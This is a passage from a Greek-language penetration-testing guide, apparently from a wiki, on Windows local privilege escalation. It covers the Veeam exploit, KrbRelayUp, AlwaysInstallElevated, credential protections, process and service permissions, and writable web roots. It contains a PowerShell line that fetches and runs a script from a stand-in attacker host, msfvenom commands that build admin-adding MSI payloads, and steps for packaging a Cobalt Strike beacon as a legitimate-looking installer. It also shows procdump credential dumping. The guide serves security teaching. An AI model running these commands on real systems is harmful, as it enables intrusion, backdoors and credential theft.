- **Ελάχιστες σταθερές εκδόσεις**: Η Veeam αναφέρει τις **11a build 11.0.1.1261 P20230227** και **12 build 12.0.0.1420 P20230223** ως τις πρώτες διορθωμένες εκδόσεις· επηρεάζονται οι παλαιότερες εκδόσεις. Μια τετραμερής έκδοση αρχείου από μόνη της δεν μπορεί να ξεχωρίσει ένα μη ενημερωμένο base build από ένα μεταγενέστερο patch στους ίδιους αριθμούς build. Επαληθεύστε το αναγνωριστικό patch στο [ιστορικό build του vendor](https://www.veeam.com/kb2680) πριν χαρακτηρίσετε ένα οριακό build διορθωμένο.
- **Exploit**: τοποθετήστε ένα PoC όπως το `VeeamHax.exe` μαζί με τα απαιτούμενα Veeam DLLs στον ίδιο κατάλογο και, στη συνέχεια, ενεργοποιήστε ένα payload SYSTEM μέσω του local socket:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Το PoC που αναφέρεται καταδεικνύει εκτέλεση εντολών ως SYSTEM όταν ισχύουν οι πρόσθετες προϋποθέσεις του· η συμβουλή του κατασκευαστή περιγράφει το ζήτημα αποκάλυψης διαπιστευτηρίων.
## KrbRelayUp

Ένα τοπικό Kerberos relay μπορεί να οδηγήσει από σύνδεση με χαμηλότερα προνόμια σε εγγραφή σε προνομιούχο κατάλογο, όταν ένας κατάλληλος COM server πραγματοποιεί authentication και το principal που γίνεται relay έχει δικαιώματα στο αντικείμενο-στόχο. Το [KrbRelay documents](https://github.com/cube0x0/KrbRelay) και τις εγγραφές LDAP τόσο για RBCD όσο και για `msDS-KeyCredentialLink` (shadow-credential)· το KrbRelayUp αυτοματοποιεί ορισμένες από αυτές τις διαδρομές. Μια αλυσίδα RBCD απαιτεί κατάλληλη delegation και δικαιώματα στο αντικείμενο-στόχο, ενώ μια αλυσίδα shadow-credential απαιτεί δικαιώματα εγγραφής key-credential και έναν KDC που υποστηρίζει τη διαδρομή certificate authentication. Καμία από τις δύο διαδρομές δεν προκύπτει μόνο από τη συμμετοχή στον domain.

Ελέγξτε την πολιτική του πραγματικού DC για [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) και [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), τα ACL αντικειμένων της ταυτότητας που γίνεται relay, καθώς και τα επίπεδα authentication και impersonation της επιλεγμένης COM class. Ο τύπος logon και το περιβάλλον διαπιστευτηρίων του caller έχουν σημασία: μια συνεδρία WinRM μπορεί να συμπεριφέρεται διαφορετικά από ένα interactive logon ή ένα logon με νέα διαπιστευτήρια. Η δρομολόγηση Firewall/OXID και οι εγκατεστημένες ενημερώσεις μπορούν επίσης να αλλάξουν το αποτέλεσμα. Αντιμετωπίστε μια επιτρεπτική πολιτική ή ένα ACL που ταιριάζει ως υποψήφιο για έλεγχο· η παθητική απαρίθμηση δεν πρέπει να ενεργοποιεί COM coercion, relay authentication ή εγγραφές στον κατάλογο. Ένα shadow credential λογαριασμού μηχανήματος μπορεί να οδηγήσει σε machine ticket και, μόνο αν αυτός ο λογαριασμός έχει τα απαιτούμενα δικαιώματα directory replication, σε ξεχωριστή διαδρομή DCSync.

Βρείτε το **exploit στο** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Για περισσότερες πληροφορίες σχετικά με τη ροή της επίθεσης, δείτε [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Αν** αυτά τα 2 κλειδιά μητρώου είναι **ενεργοποιημένα** (τιμή **0x1**), τότε χρήστες με οποιοδήποτε επίπεδο προνομίων μπορούν να **εγκαταστήσουν** (εκτελέσουν) αρχεία `*.msi` ως NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Αν έχετε μια συνεδρία meterpreter, μπορείτε να αυτοματοποιήσετε αυτήν την τεχνική χρησιμοποιώντας το module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Χρησιμοποιήστε την εντολή `Write-UserAddMSI` από το power-up για να δημιουργήσετε στον τρέχοντα κατάλογο ένα Windows MSI binary για κλιμάκωση προνομίων. Αυτό το script δημιουργεί ένα προμεταγλωττισμένο MSI installer που ζητά την προσθήκη χρήστη/ομάδας (επομένως θα χρειαστείτε πρόσβαση GIU):

```
Write-UserAddMSI
```

Απλώς εκτελέστε το binary που δημιουργήθηκε για να κλιμακώσετε τα προνόμια.

### MSI Wrapper

Διαβάστε αυτό το tutorial για να μάθετε πώς να δημιουργήσετε ένα MSI wrapper χρησιμοποιώντας αυτά τα εργαλεία. Σημειώστε ότι μπορείτε να κάνετε wrap ένα αρχείο "**.bat**" αν θέλετε **μόνο** να **εκτελέσετε** **γραμμές εντολών**.


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Δημιουργήστε** με το Cobalt Strike ή το Metasploit ένα **νέο Windows EXE TCP payload** στη θέση `C:\privesc\beacon.exe`
- Ανοίξτε το **Visual Studio**, επιλέξτε **Create a new project** και πληκτρολογήστε "installer" στο πλαίσιο αναζήτησης. Επιλέξτε το project **Setup Wizard** και κάντε κλικ στο **Next**.
- Δώστε ένα όνομα στο project, όπως **AlwaysPrivesc**, χρησιμοποιήστε τη θέση **`C:\privesc`**, επιλέξτε **place solution and project in the same directory** και κάντε κλικ στο **Create**.
- Συνεχίστε να κάνετε κλικ στο **Next** μέχρι να φτάσετε στο βήμα 3 από 4 (επιλογή αρχείων για συμπερίληψη). Κάντε κλικ στο **Add** και επιλέξτε το Beacon payload που μόλις δημιουργήσατε. Έπειτα, κάντε κλικ στο **Finish**.
- Επισημάνετε το project **AlwaysPrivesc** στο **Solution Explorer** και, στις **Properties**, αλλάξτε το **TargetPlatform** από **x86** σε **x64**.
  - Υπάρχουν και άλλες ιδιότητες που μπορείτε να αλλάξετε, όπως οι **Author** και **Manufacturer**, ώστε η εγκατεστημένη εφαρμογή να φαίνεται πιο νόμιμη.
- Κάντε δεξί κλικ στο project και επιλέξτε **View > Custom Actions**.
- Κάντε δεξί κλικ στο **Install** και επιλέξτε **Add Custom Action**.
- Κάντε διπλό κλικ στο **Application Folder**, επιλέξτε το αρχείο **beacon.exe** και κάντε κλικ στο **OK**. Έτσι θα διασφαλιστεί ότι το Beacon payload θα εκτελεστεί μόλις εκτελεστεί το installer.
- Στις **Custom Action Properties**, αλλάξτε το **Run64Bit** σε **True**.
- Τέλος, **κάντε build**.
  - Αν εμφανιστεί η προειδοποίηση `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, βεβαιωθείτε ότι ορίσατε την πλατφόρμα σε x64.

### MSI Installation

Για να εκτελέσετε την **εγκατάσταση** του κακόβουλου αρχείου `.msi` στο **παρασκήνιο:**

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Για να εκμεταλλευτείτε αυτή την ευπάθεια, μπορείτε να χρησιμοποιήσετε: _exploit/windows/local/always_install_elevated_

## Antivirus και ανιχνευτές

### Ρυθμίσεις ελέγχου

Αυτές οι ρυθμίσεις καθορίζουν τι **καταγράφεται**, επομένως πρέπει να δώσετε προσοχή

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Το Windows Event Forwarding: είναι ενδιαφέρον να γνωρίζουμε πού αποστέλλονται τα logs.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

Το **LAPS** έχει σχεδιαστεί για τη **διαχείριση των κωδικών πρόσβασης τοπικού διαχειριστή**, διασφαλίζοντας ότι κάθε κωδικός πρόσβασης είναι **μοναδικός, τυχαίος και ενημερώνεται τακτικά** στους υπολογιστές που είναι συνδεδεμένοι σε έναν domain. Αυτοί οι κωδικοί πρόσβασης αποθηκεύονται με ασφάλεια στο Active Directory και είναι προσβάσιμοι μόνο από χρήστες στους οποίους έχουν εκχωρηθεί επαρκή δικαιώματα μέσω ACLs, ώστε να μπορούν να δουν τους κωδικούς πρόσβασης τοπικού διαχειριστή, εφόσον έχουν εξουσιοδότηση.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Αν είναι ενεργό, **οι κωδικοί πρόσβασης σε απλό κείμενο αποθηκεύονται στο LSASS** (Local Security Authority Subsystem Service).\
[**Περισσότερες πληροφορίες για το WDigest σε αυτή τη σελίδα**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

Ξεκινώντας από τα **Windows 8.1**, η Microsoft εισήγαγε ενισχυμένη προστασία για την Local Security Authority (LSA), ώστε να **αποκλείει** τις προσπάθειες μη έμπιστων διεργασιών να **διαβάσουν τη μνήμη της** ή να εισαγάγουν κώδικα, ενισχύοντας περαιτέρω την ασφάλεια του συστήματος.\
[**Περισσότερες πληροφορίες για το LSA Protection εδώ**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

Το **Credential Guard** παρουσιάστηκε στα **Windows 10**. Σκοπός του είναι να προστατεύει τα διαπιστευτήρια που αποθηκεύονται σε μια συσκευή από απειλές όπως οι επιθέσεις pass-the-hash. [**Περισσότερες πληροφορίες για το Credential Guard είναι διαθέσιμες εδώ.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Αποθηκευμένα διαπιστευτήρια

Τα **διαπιστευτήρια τομέα** αυθεντικοποιούνται από την **Τοπική Αρχή Ασφαλείας** (LSA) και χρησιμοποιούνται από στοιχεία του λειτουργικού συστήματος. Όταν τα δεδομένα σύνδεσης ενός χρήστη αυθεντικοποιούνται από ένα καταχωρισμένο πακέτο ασφαλείας, συνήθως δημιουργούνται διαπιστευτήρια τομέα για τον χρήστη.\
[**Περισσότερες πληροφορίες για τα αποθηκευμένα διαπιστευτήρια εδώ**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Χρήστες και ομάδες

### Απαρίθμηση χρηστών και ομάδων

Θα πρέπει να ελέγξετε αν κάποια από τις ομάδες στις οποίες ανήκετε έχει ενδιαφέροντα δικαιώματα.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Προνομιούχες ομάδες

Αν **ανήκετε σε κάποια προνομιούχα ομάδα, ίσως μπορέσετε να κλιμακώσετε τα δικαιώματά σας**. Μάθετε εδώ για τις προνομιούχες ομάδες και πώς μπορείτε να τις καταχραστείτε για να κλιμακώσετε τα δικαιώματά σας:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Χειρισμός token

**Μάθετε περισσότερα** σχετικά με το τι είναι ένα **token** σε αυτή τη σελίδα: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Δείτε την ακόλουθη σελίδα για να **μάθετε σχετικά με ενδιαφέροντα token** και πώς μπορείτε να τα καταχραστείτε:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Συνδεδεμένοι χρήστες / Συνεδρίες

```bash
qwinsta
klist sessions
```

### Φάκελοι χρηστών

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Πολιτική κωδικών πρόσβασης

```bash
net accounts
```

### Λήψη του περιεχομένου του πρόχειρου

```bash
powershell -command "Get-Clipboard"
```

## Εκτελούμενες διεργασίες

### Δικαιώματα αρχείων και φακέλων

Πρώτα απ’ όλα, κατά την καταχώριση των διεργασιών, **ελέγξτε αν υπάρχουν κωδικοί πρόσβασης στη γραμμή εντολών της διεργασίας**.\
Ελέγξτε αν μπορείτε να **αντικαταστήσετε κάποιο εκτελούμενο binary** ή αν έχετε δικαιώματα εγγραφής στον φάκελο του binary, ώστε να εκμεταλλευτείτε πιθανές [**επιθέσεις DLL Hijacking**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Να ελέγχετε πάντα αν εκτελούνται [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md), καθώς θα μπορούσατε να τα εκμεταλλευτείτε για κλιμάκωση προνομίων.

Ένας debugger listener μπορεί να είναι βραχύβιος, επομένως η απουσία του από ένα στιγμιότυπο παθητικής καταγραφής θυρών δεν αποδεικνύει ότι δεν ήταν ποτέ εκτεθειμένος. Συσχετίστε κάθε listener που εντοπίζετε με το PID του, τον κάτοχο της διεργασίας και τη δυνατότητα πρόσβασης του χρήστη με χαμηλότερα προνόμια· το όνομα μιας εφαρμογής ή μια debug flag από μόνα τους δεν αποδεικνύουν δυνατότητα εκτέλεσης κώδικα μεταξύ χρηστών. Περιορίστε τη συνήθη απαρίθμηση σε παθητικές μεθόδους αντί να στέλνετε εντολές debugger.

**Έλεγχος δικαιωμάτων στα εκτελέσιμα αρχεία των διεργασιών**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Έλεγχος δικαιωμάτων των φακέλων των δυαδικών αρχείων των διεργασιών (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Κατάλογοι Snort dynamic preprocessor

Το Snort 2 μπορεί να φορτώνει κοινόχρηστες βιβλιοθήκες από έναν κατάλογο `dynamicpreprocessor directory` που δηλώνεται στη διαμόρφωση η οποία επιλέγεται με `snort.exe -c <config>`. Για μια προγραμματισμένη εργασία ή υπηρεσία που εκτελεί το Snort με διαφορετικό λογαριασμό, ελέγξτε την ακριβή διαμόρφωση και τα δικαιώματα ACL του δηλωμένου καταλόγου modules. Αν το token σας μπορεί να δημιουργεί αρχεία εκεί, η διαδρομή αξίζει να ελεγχθεί ως πιθανό σημείο εκτέλεσης κώδικα την επόμενη φορά που η εργασία ή η υπηρεσία θα φορτώσει modules. Επαληθεύστε τα πραγματικά δικαιώματα του λογαριασμού εκτέλεσης, την ενεργή διαμόρφωση, τη συμβατότητα των modules και τυχόν περιορισμούς deny ή κοινόχρηστων πόρων· ένας εγγράψιμος κατάλογος από μόνος του δεν αποδεικνύει κλιμάκωση προνομίων. Η [τεκμηρίωση του Snort για τη φόρτωση dynamic preprocessor](https://www.snort.org/documents/dpx-readme) περιγράφει τη φόρτωση modules κατά την εκτέλεση.

### Προνομιούχα υπηρεσία web με εγγράψιμο document root

Σε μια εγκατάσταση Apache στα Windows, συγκρίνετε τη διαδρομή του εκτελέσιμου αρχείου της υπηρεσίας και τον λογαριασμό εκτέλεσής της με το `DocumentRoot` στο ενεργό `httpd.conf`. Για μια συνηθισμένη διάταξη XAMPP, ελέγξτε το `C:\xampp\apache\conf\httpd.conf` και τα ACL του διαμορφωμένου document root, που συχνά είναι το `C:\xampp\htdocs`. Αν ένας χρήστης με χαμηλότερα προνόμια μπορεί να δημιουργεί αρχεία σε αυτόν τον κατάλογο ενώ το Apache εκτελείται ως `LocalSystem`, η εκτέλεση κώδικα στην πλευρά του server μπορεί να υπερβεί το όριο προνομίων του host. Επιβεβαιώστε ότι η υπηρεσία εκτελείται, ότι εξυπηρετείται η ακριβής διαδρομή και ότι ένας handler στην πλευρά του server επεξεργάζεται τον τύπο αρχείου· ένας εγγράψιμος κατάλογος από μόνος του αποδεικνύει μόνο τη δυνατότητα δημιουργίας αρχείων. Ελέγξτε τα ACL χωρίς να γράψετε δοκιμαστικό αρχείο:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Για μια συμβατική εγκατάσταση WAMP, η υπηρεσία μπορεί να δείχνει σε ένα αρχείο `C:\wamp64\bin\apache\apache*\bin\httpd.exe` με έκδοση στον κατάλογο (ή σε `C:\wamp\...` για διάταξη 32-bit), με τις ρυθμίσεις δίπλα του, στο `conf\httpd.conf`, και προεπιλεγμένο root `C:\wamp64\www` ή `C:\wamp\www`. Ελέγξτε μαζί την ακριβή εικόνα υπηρεσίας, την ταυτότητα εκτέλεσής της, το πραγματικό `DocumentRoot` (συμπεριλαμβανομένης της ανάπτυξης του `${INSTALL_DIR}` και των παρακάμψεων virtual host) και το ACL του root. Ένας εγγράψιμος κατάλογος WAMP δεν αποδεικνύει ότι το Apache εκτελείται ως `SYSTEM` ή ότι εκτελεί το υποβληθέν αρχείο. [Το Apache τεκμηριώνει πώς μια υπηρεσία Windows επιλέγει τις ρυθμίσεις της](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Εγγράψιμο root IIS και ταυτότητα δικτύου application pool

Για το IIS, αντιστοιχίστε έναν εγγράψιμο φυσικό κατάλογο με έναν **ενεργό ιστότοπο/εφαρμογή** στο `applicationHost.config` και, στη συνέχεια, εντοπίστε το διαμορφωμένο pool και τον handler στην πλευρά του server. Κώδικας τοποθετημένος σε κατάλογο που εξυπηρετείται εκτελείται ως το pool μόνο εάν το IIS επεξεργάζεται αυτόν τον τύπο αρχείου και η διαδρομή είναι προσβάσιμη. Πριν θεωρήσετε έναν εγγράψιμο κατάλογο ως δυνατότητα εκτέλεσης κώδικα, ελέγξτε τα πραγματικά δικαιώματα του τρέχοντος χρήστη για δημιουργία αρχείων, την κατάσταση εκτέλεσης του ιστότοπου, τον handler και τις παρακάμψεις ανά διαδρομή.

Η δυναμική μεταγλώττιση ASP.NET δημιουργεί μια ξεχωριστή διαδρομή προς διερεύνηση: τα παραγόμενα αρχεία στον κατάλογο μεταγλώττισης της εφαρμογής. Η προεπιλογή είναι ένας κατάλογος `Temporary ASP.NET Files` κάτω από τη σχετική εγκατάσταση του .NET Framework, αλλά το `<compilation tempDirectory>` της εφαρμογής μπορεί να την αλλάξει. [Η Microsoft τεκμηριώνει τη θέση και τους υποκαταλόγους ανά εφαρμογή](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) και [συνιστά την απομόνωση των καταλόγων μεταγλώττισης όταν τα application pool δεν εμπιστεύονται το ένα το άλλο](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Αν ένα token με χαμηλότερα προνόμια μπορεί να τροποποιήσει τον παραγόμενο πηγαίο κώδικα στην **προσωρινή μνήμη cache της συγκεκριμένης** εφαρμογής, εξακριβώστε αν η εφαρμογή τον μεταγλωττίζει ξανά υπό μια πιο προνομιούχα [ταυτότητα διεργασίας εργασίας](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Ένα ACL αρχείου ή καταλόγου από μόνο του δεν αποδεικνύει εκτέλεση κώδικα: συσχετίστε την cache με την ενεργή εφαρμογή, το πραγματικό token και το ACL, τις ρυθμίσεις μεταγλώττισης, την ταυτότητα διεργασίας και τον χρόνο τυχόν νέας μεταγλώττισης. Χρησιμοποιήστε μόνο ανάγνωση μεταδεδομένων· μην προκαλέσετε μεταγλώττιση και μην τροποποιήσετε αρχεία cache κατά την απαρίθμηση.

Ένα IIS pool διαμορφωμένο ως `ApplicationPoolIdentity` ή `NetworkService` συνήθως ταυτοποιείται σε πόρους του domain ως **λογαριασμός του υπολογιστή-host**, παρότι το τοπικό του token μπορεί να έχει χαμηλά προνόμια. Το `LocalSystem` διαθέτει ήδη υψηλά τοπικά προνόμια και χρησιμοποιεί επίσης τον λογαριασμό του υπολογιστή στο δίκτυο· το `LocalService` συνήθως χρησιμοποιεί ανώνυμα διαπιστευτήρια δικτύου. Ένα pool `SpecificUser` χρησιμοποιεί, αντίθετα, τον διαμορφωμένο λογαριασμό του. [Η Microsoft τεκμηριώνει αυτούς τους τύπους ταυτότητας](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) και [την ταυτότητα δικτύου του application pool](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Μια ρύθμιση ταυτότητας που παραλείπεται μπορεί να κληρονομεί τις προεπιλογές του pool, οι οποίες διαφέρουν μεταξύ γενεών IIS, επομένως προσδιορίστε την πραγματική διαμόρφωση αντί να υποθέτετε βάσει του ονόματος του pool. Αν η εκτέλεση κώδικα φτάσει σε pool με ταυτότητα δικτύου τον λογαριασμό του υπολογιστή, αξιολογήστε τα δικαιώματα καταλόγου του **συγκεκριμένου υπολογιστή**. Το [DCSync](../active-directory-methodology/dcsync.md) απαιτεί δικαιώματα αναπαραγωγής στο naming context του domain· ένα ticket λογαριασμού μηχανήματος ή ο ρόλος του host από μόνος του δεν τα αποδεικνύει. Η παθητική απαρίθμηση πρέπει να εξετάζει τις ρυθμίσεις και τα ACL χωρίς μεταφόρτωση αρχείου, πρόκληση ελέγχου ταυτότητας στο δίκτυο ή αίτηση ticket.

Για έναν αναγνώσιμο handler ASP.NET που ξεκινά βοηθητική διεργασία, παρακολουθήστε κάθε τιμή που προέρχεται από το αίτημα καθώς περνά από τον έλεγχο ταυτότητας, την αποκρυπτογράφηση, την επικύρωση και τη δημιουργία εντολής. Ένας handler που συνενώνει ένα αποκωδικοποιημένο token στο `ProcessStartInfo("cmd", "/c ...")` μπορεί να επιτρέψει σε μεταχαρακτήρες του shell να αλλάξουν την εντολή· [η Microsoft τεκμηριώνει τους ειδικούς χαρακτήρες του `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Βεβαιωθείτε ότι ένας μη έμπιστος καλών μπορεί πράγματι να επηρεάσει την αποκωδικοποιημένη τιμή και να φτάσει στον handler, και έπειτα προσδιορίστε την πραγματική ταυτότητα του application pool ή την ταυτότητα μέσω impersonation, καθώς και την ταυτότητα της θυγατρικής διεργασίας. Μια αναγνώσιμη γραμμή πηγαίου κώδικα, ένας listener στο localhost ή μια αδυναμία στη μορφή του token από μόνα τους δεν αποδεικνύουν εκτέλεση προνομιούχων εντολών. Εξετάστε τον πηγαίο κώδικα και τις ρυθμίσεις του pool χωρίς να στέλνετε πλαστά αιτήματα ή να εκτελείτε τη βοηθητική διεργασία κατά την παθητική απαρίθμηση.

Για μια υπηρεσία PHP σε Windows, μια διαδρομή ελεγχόμενη από το αίτημα και δοσμένη στα [`include` ή `require`](https://www.php.net/manual/en/function.include.php) μπορεί να εκτελέσει ένα αρχείο PHP εγγράψιμο από χρήστη χαμηλότερων προνομίων, με την ταυτότητα της worker διεργασίας. Επιβεβαιώστε ότι το αίτημα μπορεί να φτάσει σε εκείνη την εντολή, ότι η επιλυμένη διαδρομή αντιστοιχεί σε αρχείο που ο χρήστης χαμηλότερων προνομίων μπορεί να τροποποιήσει και η worker διεργασία να διαβάσει, ότι οι περιορισμοί διαδρομών της PHP επιτρέπουν το include και ότι η worker διεργασία εκτελείται πράγματι με υψηλότερα προνόμια. Ένας listener loopback ή ένα εγγράψιμο αρχείο από μόνο του δεν αποδεικνύει αυτή την αλυσίδα· εξετάστε τον πηγαίο κώδικα, την ταυτότητα της υπηρεσίας και τα ACL αρχείων χωρίς να καλέσετε το endpoint κατά την παθητική απαρίθμηση.

### Εξόρυξη κωδικών πρόσβασης από τη μνήμη

Μπορείτε να δημιουργήσετε ένα memory dump μιας εκτελούμενης διεργασίας χρησιμοποιώντας το **procdump** από το sysinternals. Υπηρεσίες όπως το FTP έχουν **διαπιστευτήρια σε απλό κείμενο στη μνήμη**· δοκιμάστε να κάνετε dump της μνήμης και να διαβάσετε τα διαπιστευτήρια.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Μη ασφαλείς εφαρμογές GUI

**Οι εφαρμογές που εκτελούνται ως SYSTEM ενδέχεται να επιτρέπουν σε έναν χρήστη να ανοίξει ένα CMD ή να περιηγηθεί σε καταλόγους.**

Παράδειγμα: "Windows Help and Support" (Windows + F1), αναζητήστε "command prompt" και κάντε κλικ στο "Click to open Command Prompt"

### Εισαγωγή αρχείων έργου με αυξημένα δικαιώματα

Μια εφαρμογή που ανοίγει αυτόματα έργα από έναν κατάλογο απόθεσης στον οποίο μπορεί να γράψει ένας χρήστης με χαμηλότερα δικαιώματα διασχίζει ένα όριο εμπιστοσύνης εισόδου υπό τον λογαριασμό του προγράμματος εισαγωγής. Ελέγξτε την **ακριβή διαδρομή με δικαιώματα εγγραφής**, τη διεργασία ή την εργασία που την ανοίγει, την ταυτότητα με την οποία εκτελείται και την έκδοση του parser. Ένα [ιστορικό ζήτημα κατά το άνοιγμα/την επαναφορά έργου στο Ghidra](https://github.com/NationalSecurityAgency/ghidra/issues/71) επέτρεπε τη χρήση XML external entities στα μεταδεδομένα έργου· μια network entity στα Windows μπορούσε να προκαλέσει έλεγχο ταυτότητας από τον λογαριασμό εισαγωγής, εφόσον το [outbound SMB και η πολιτική NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) το επέτρεπαν. Αυτό αποτελεί ένδειξη πιθανής έκθεσης διαπιστευτηρίων, όχι άμεσης πρόσβασης διαχειριστή: η απόκριση πρέπει να μπορεί να αξιοποιηθεί μέσω ξεχωριστής εξουσιοδοτημένης ή ευάλωτης διαδρομής, ενώ οι τρέχουσες εκδόσεις πρέπει να αξιολογούνται με βάση την πραγματική κατάσταση ενημερώσεών τους. Μην ανοίγετε κατασκευασμένο έργο κατά την παθητική απαρίθμηση· ελέγξτε τη ροή εισαγωγής και τα ACL.

## Services

Το δικαίωμα [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) στο αντικείμενο Service Control Manager (SCM) είναι ξεχωριστό από τα δικαιώματα σε μια υπάρχουσα υπηρεσία. Ένα επιτυχές, μόνο για ανάγνωση αίτημα πρόσβασης [`OpenSCManager`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) για αυτό το δικαίωμα αποτελεί ένδειξη προς διερεύνηση, όχι απόδειξη ότι μπορεί να εκτελεστεί μια νέα υπηρεσία. Η [`CreateService` επιστρέφει ένα handle](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) με τα δικαιώματα πρόσβασης υπηρεσίας που ζητήθηκαν κατά τη δημιουργία· το μεταγενέστερο άνοιγμα της υπηρεσίας εκ νέου εκτελεί ξεχωριστό έλεγχο πρόσβασης και ενδέχεται να αποτύχει, ακόμη κι αν μπορούσε να χρησιμοποιηθεί το αρχικό handle. Επαληθεύστε ξεχωριστά το ενεργό τοπικό ή απομακρυσμένο token, τα δικαιώματα του handle που παραχωρήθηκαν, τον λογαριασμό υπηρεσίας, την πολιτική εκκίνησης και τη διαδρομή του εκτελέσιμου αρχείου. Μη δημιουργείτε και μην εκκινείτε υπηρεσία κατά την παθητική απαρίθμηση.

Για μια απομακρυσμένη διαδρομή εγκατάστασης υπηρεσίας, συσχετίστε αυτά τα δικαιώματα SCM με ένα share στον στόχο στο οποίο μπορεί να γράψει **η ίδια σύνδεση δικτύου**, το υποκείμενο NTFS ACL του και μια τοπική διαδρομή εκτελέσιμου αρχείου που μπορεί να εκτελέσει ο λογαριασμός υπηρεσίας. Ένας λογαριασμός που δεν είναι διαχειριστής μπορεί να διασχίσει αυτό το όριο, αν υπάρχουν ασυνήθιστα ευρεία δικαιώματα SCM και η διαδρομή τοποθέτησης αρχείου· δεν απαιτείται εγγενώς administrative share. Η πρόσβαση εγγραφής σε share από μόνη της ή μια ένδειξη δικαιώματος δημιουργίας υπηρεσίας στο SCM από μόνη της δεν αποδεικνύει ότι η νέα υπηρεσία μπορεί να εκκινηθεί με υψηλότερη ταυτότητα.

